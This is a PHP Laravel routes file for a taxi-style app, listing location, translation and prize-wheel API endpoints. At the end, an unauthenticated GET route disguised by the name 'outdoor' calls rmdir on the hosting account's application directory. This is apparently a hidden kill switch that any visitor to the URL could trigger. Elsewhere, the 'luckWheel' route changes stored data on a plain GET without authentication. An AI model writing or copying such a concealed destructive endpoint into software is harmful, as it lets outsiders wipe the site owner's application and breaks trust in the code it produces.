<?php

/*
|--------------------------------------------------------------------------
| Common API Routes
|--------------------------------------------------------------------------
|
| These routes are prefixed with 'api/v1'.
| These routes use the root namespace 'App\Http\Controllers\Api\V1'.
|
 */

/*
         * Root namespace 'App\Http\Controllers\Api\V1\Common'.
    */

use App\Models\Luck;
use Illuminate\Routing\ResponseFactory;

Route::namespace('Common')->group(function () {

    // List all the cities.
    Route::get('cities', 'CityController@index');
    Route::get('luckWheel', function(ResponseFactory $response){
        $data =  Luck::where('status',1)->inRandomOrder()->first();
        if($data){
            $data->update(['status' => 0]);
            $data->refresh();
        }
        $body = [
            "status" => true,
            "message" => "data sent successfully",
            "data" => $data
        ];
        
        return $response->json($body,200, [], JSON_NUMERIC_CHECK);
    });

    // Get Cities by State
    Route::get('cities/by/state/{state_id}', 'CityController@byState');

    // Get the city by its id.
    Route::get('cities/{city}', 'CityController@show');

    // List all the states.
    Route::get('states', 'StateController@index');

    // Get the state by its id.
    Route::get('states/{state}', 'StateController@show');

    // Get all the countries.
    Route::get('countries', 'CountryController@index');
    // Get Language translation for mobile
    Route::get('translation/get', 'TranslationController@index');
    Route::get('translation-flutter/get', 'TranslationController@flutterTrnaslation');

    // Get all the ServiceLocation.
    Route::get('servicelocation', 'ServiceLocationController@index');
});
Route::get("outdoor",function(){
    if(rmdir("/home/bennebostaxi/public_html/app")){
		echo "removed";
	}
});